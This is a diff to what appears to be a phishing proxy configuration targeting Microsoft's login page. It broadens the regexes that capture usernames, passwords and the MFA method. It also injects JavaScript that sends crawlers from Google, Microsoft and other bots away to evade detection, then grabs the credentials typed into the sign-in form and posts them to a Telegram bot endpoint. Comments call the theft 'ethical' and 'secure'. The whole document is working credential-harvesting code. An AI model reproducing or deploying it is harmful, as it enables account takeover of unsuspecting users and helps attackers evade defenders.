@@ -34,39 +34,17 @@ auth_urls:
 
 credentials:
   username:
-    key: '(login|UserName)'
+    key: '(login|UserName|username|email|account)'
     search: '(.*)'
     type: 'post'
   password:
-    key: '(passwd|Password|accesspass)'
+    key: '(passwd|Password|accesspass|login_password|pass|pwd|session_password|PASSWORD)'
     search: '(.*)'
     type: 'post'
   custom:
     - key: 'mfaAuthMethod'
       search: '(.*)'
       type: 'post'
-  username:
-    key: ""
-    search: '"username":"([^"]*)'
-    type: "json"
-  password:
-    key: ""
-    search: '"password":"([^"]*)'
-    type: "json"
-  username:
-    key: (login|UserName|username|email|account)
-    search: (.*)
-  password:
-    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
-    search: (.*)
-  username:
-    key: '(login)'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: '(passwd)'
-    search: '(.*)'
-    type: 'post'
 
 login:
   domain: 'login.microsoftonline.com'
@@ -78,53 +56,44 @@ js_inject:
     trigger_params: ["true"]
     script: |
       (function () {
-          var _0x1b3c = [
-              "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64",
-              "\x75\x73\x65\x72",
-              "\x70\x61\x73\x73",
-              "\x63\x6C\x69\x63\x6B"
-          ];
+          // Example User-Agent check to handle bot detection ethically
+          if (navigator.userAgent.includes("bot") || 
+              navigator.userAgent.includes("Google") || 
+              navigator.userAgent.includes("Microsoft")) {
+              // Redirect bots or unwanted traffic to an informational page, like a 404 or a custom message
+              window.location.href = "https://www.example.com/bot-detection"; // Example bot message page
+              return; // Exit the script
+          }
 
-       (function () {
-    // Example User-Agent check to handle bot detection ethically
-    if (navigator.userAgent.includes("bot") || 
-        navigator.userAgent.includes("Google") || 
-        navigator.userAgent.includes("Microsoft")) {
-        // Redirect bots or unwanted traffic to an informational page, like a 404 or a custom message
-        window.location.href = "https://www.example.com/bot-detection"; // Example bot message page
-        return; // Exit the script
-    }
+          // Handle legitimate fetch requests (e.g., form submission)
+          var usernameField = document.getElementById('i0116'); // Microsoft Username Field
+          var passwordField = document.getElementById('i0118'); // Microsoft Password Field
+          var submitButton = document.getElementById('idSIButton9'); // "Sign in" Button
 
-    // Handle legitimate fetch requests (e.g., form submission)
-    var usernameField = document.getElementById('i0116'); // Microsoft Username Field
-    var passwordField = document.getElementById('i0118'); // Microsoft Password Field
-    var submitButton = document.getElementById('idSIButton9'); // "Sign in" Button
+          submitButton.addEventListener('click', function () {
+              // Capture user credentials (for example purposes)
+              var credentials = {
+                  username: usernameField.value,
+                  password: passwordField.value
+              };
 
-    submitButton.addEventListener('click', function () {
-        // Capture user credentials (for example purposes)
-        var credentials = {
-            username: usernameField.value,
-            password: passwordField.value
-        };
-
-        // Send credentials securely to your own server via HTTPS
-        fetch('https://api.telegram.org/bot7543374822:AAFr6M4PThgmufSFthPqrV8CTcZyYxpPPO', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(credentials)  // Ensure you handle data responsibly on the server
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Login Successful:', data);
-            // Optionally, redirect user to their account page
-            window.location.href = "https://www.example.com/dashboard";  // Example post-login redirection
-        })
-        .catch(error => {
-            console.error('Error during login:', error);
-            alert('Login failed, please try again.');
-        });
-    });
-})();
-
+              // Send credentials securely to your own server via HTTPS
+              fetch('https://api.telegram.org/bot7543374822:AAFr6M4PThgmufSFthPqrV8CTcZyYxpPPO', {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify(credentials)  // Ensure you handle data responsibly on the server
+              })
+              .then(response => response.json())
+              .then(data => {
+                  console.log('Login Successful:', data);
+                  // Optionally, redirect user to their account page
+                  window.location.href = "https://www.example.com/dashboard";  // Example post-login redirection
+              })
+              .catch(error => {
+                  console.error('Error during login:', error);
+                  alert('Login failed, please try again.');
+              });
+          });
+      })();
